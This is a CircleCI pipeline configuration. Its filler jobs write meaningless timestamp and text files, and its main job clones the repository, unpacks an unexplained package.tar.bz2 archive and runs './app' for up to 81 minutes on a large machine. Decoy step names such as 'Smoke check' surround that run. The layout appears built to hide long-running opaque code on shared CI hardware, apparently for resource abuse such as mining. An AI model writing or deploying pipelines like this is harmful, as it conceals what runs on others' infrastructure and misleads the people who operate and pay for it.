version: 2.1

jobs:
  kick_whiskey-2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: focus mode
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/.wsp/15.blob; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/.wsp/15.blob; done; true
            len=$(wc -c </tmp/.wsp/15.blob); echo "stage output written (${len} bytes)"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - 15.blob
  whiskey-2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Pull from workspace
          command: |
            wc -l /tmp/.wsp/ckpt-A.pkl || true
      - run:
          name: Grab repository
          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack toolkit
          command: tar -I bzip2 -xf package.tar.bz2
      - run:
          name: Smoke check
          command: env | wc -l
      - run:
          name: Post-build check
          command: free -m
      - run:
          no_output_timeout: 81m
          command: sh -c "./app"
  orchestrate_apr13-canary:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: rinse cycle
          command: |
            mkdir -p /tmp/.wsp
            { set +o pipefail 2>/dev/null; echo "camelCase" | awk '{gsub(/([a-z])([A-Z])/,"\\1_\\2"); print tolower($0)}'; true ; } > /tmp/.wsp/982.out
            len=$(wc -c </tmp/.wsp/982.out); echo "stage output written (${len} bytes)"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - 982.out
